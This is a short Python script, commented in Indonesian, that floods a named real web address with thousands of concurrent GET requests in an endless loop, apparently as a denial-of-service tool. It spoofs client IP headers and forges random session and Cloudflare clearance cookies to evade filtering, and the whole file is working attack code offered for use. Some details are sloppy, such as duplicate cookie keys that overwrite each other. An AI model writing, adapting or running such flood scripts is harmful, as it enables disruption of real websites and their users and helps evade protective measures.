import aiohttp
import asyncio
import secrets  # Import modul secrets untuk nilai acak

# Konfigurasi IP palsu
fake_ip_range = '101.78.64.0/18'
fake_ip_filter = ['*.lan', '*.local']
nameserver = ['8.8.8.8']

# Buat kustom header dengan alamat IP palsu dan cookie palsu
custom_headers = {
    'X-Forwarded-For': fake_ip_range,
    'X-Client-IP': fake_ip_range,
    'cookie': f'PHPSESSID={secrets.token_hex(16)}',  # Cookie palsu dengan nilai acak
    'cookie': f'adLastShownTime={secrets.token_hex(16)}',
    'cookie': f'adViewCount={secrets.token_hex(16)}',
    'cookie': f'cf_clearance={secrets.token_hex(16)}'
}

async def send_request(url):
    try:
        async with aiohttp.ClientSession(headers=custom_headers) as session:
            async with session.get(url) as response:
                response_text = await response.text()
                return response_text
    except Exception as e:
        return None

async def main():
    default_url = 'http://sxtcp.tg-index.workers.dev'  # URL default
    num_requests = 9000 # Jumlah permintaan yang ingin Anda kirim

    while True:
        # Inisialisasi list untuk menyimpan hasil respons
        responses = []

        # Buat daftar 10 tugas tambahan untuk mengirim permintaan
        additional_tasks = [send_request(default_url) for _ in range(50)]
        
        # Gabungkan tugas-tugas tambahan dengan tugas sebelumnya
        tasks = [send_request(default_url) for _ in range(num_requests)]
        tasks += additional_tasks

        # Jalankan tugas-tugas secara bersamaan
        responses = await asyncio.gather(*tasks)

        # Handle hasil respons di sini
        for response in responses:
            if response is not None:
                print('Success')
            else:
                print('Failed')

if __name__ == "__main__":
    asyncio.run(main())
